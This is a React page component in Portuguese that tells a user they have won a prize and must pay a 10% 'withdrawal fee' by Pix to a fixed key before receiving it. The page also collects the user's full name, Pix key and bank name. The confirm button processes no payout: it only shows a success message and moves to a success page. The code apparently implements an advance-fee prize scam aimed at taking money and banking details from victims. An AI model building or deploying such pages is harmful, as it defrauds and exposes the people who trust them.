import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { CheckCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";

const Withdrawal = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const totalPrize = (location.state as { totalPrize: number })?.totalPrize || 0;
  const withdrawalFee = totalPrize * 0.10; // 10% of the total prize
  const pixKeyForPayment = "11.111.111/0001-11"; // Placeholder Pix key for payment

  const [fullName, setFullName] = useState("");
  const [bankPixKey, setBankPixKey] = useState("");
  const [bankName, setBankName] = useState("");

  const handleConfirmWithdrawal = () => {
    if (!fullName || !bankPixKey || !bankName) {
      toast.error("Por favor, preencha todos os campos para o saque.");
      return;
    }
    // Aqui você poderia adicionar a lógica para processar o saque
    // Por enquanto, apenas navegaremos para a página de sucesso
    toast.success("Informações de saque enviadas! Seu prêmio será processado após o pagamento da taxa.");
    navigate("/withdrawal-success"); // Navega para a nova página de sucesso
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-teal-500 to-cyan-600 text-white p-4">
      <Card className="w-full max-w-md bg-white text-gray-900 shadow-xl rounded-lg">
        <CardHeader className="text-center">
          <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
          <CardTitle className="text-3xl font-bold mb-2">
            Saque Disponível!
          </CardTitle>
          <CardDescription className="text-lg text-gray-600">
            Parabéns pelo seu prêmio!
          </CardDescription>
        </CardHeader>
        <CardContent className="p-6">
          <div className="mb-6 text-center">
            <p className="text-xl font-semibold mb-2">
              Prêmio Total:{" "}
              <span className="text-green-600 font-bold">
                R${totalPrize.toFixed(2).replace(".", ",")}
              </span>
            </p>
            <p className="text-lg text-gray-700">
              Taxa de Saque (10%):{" "}
              <span className="font-bold">
                R${withdrawalFee.toFixed(2).replace(".", ",")}
              </span>
            </p>
            <p className="text-lg text-gray-700 mt-2">
              Valor a Receber:{" "}
              <span className="font-bold text-blue-600">
                R${(totalPrize - withdrawalFee).toFixed(2).replace(".", ",")}
              </span>
            </p>
          </div>

          <div className="bg-gray-100 p-4 rounded-md mb-6 border border-gray-200">
            <p className="text-md font-semibold mb-2">
              Para receber seu prêmio, pague a taxa via Pix:
            </p>
            <p className="text-lg font-bold text-center text-purple-700 break-all">
              Chave Pix: {pixKeyForPayment}
            </p>
            <p className="text-sm text-gray-600 text-center mt-2">
              (Copie e cole no seu aplicativo bancário)
            </p>
          </div>

          <div className="space-y-4 mb-6">
            <p className="text-center text-md text-gray-800 font-semibold">
              Preencha seus dados para receber o Pix:
            </p>
            <Input
              type="text"
              placeholder="Nome Completo"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              className="text-center text-lg py-6"
            />
            <Input
              type="text"
              placeholder="Sua Chave Pix Bancária"
              value={bankPixKey}
              onChange={(e) => setBankPixKey(e.target.value)}
              className="text-center text-lg py-6"
            />
            <Input
              type="text"
              placeholder="Nome do Seu Banco"
              value={bankName}
              onChange={(e) => setBankName(e.target.value)}
              className="text-center text-lg py-6"
            />
            <p className="text-center text-sm text-gray-600">
              As informações são necessárias para que o Pix seja efetuado na sua conta correta.
            </p>
          </div>

          <p className="text-center text-md text-gray-800">
            Após a confirmação do pagamento da taxa, seu prêmio será enviado via Pix em até 30 minutos.
          </p>
          <Button
            onClick={handleConfirmWithdrawal}
            className="w-full mt-8 bg-blue-600 hover:bg-blue-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
          >
            Confirmar Saque
          </Button>
        </CardContent>
      </Card>
    </div>
  );
};

export default Withdrawal;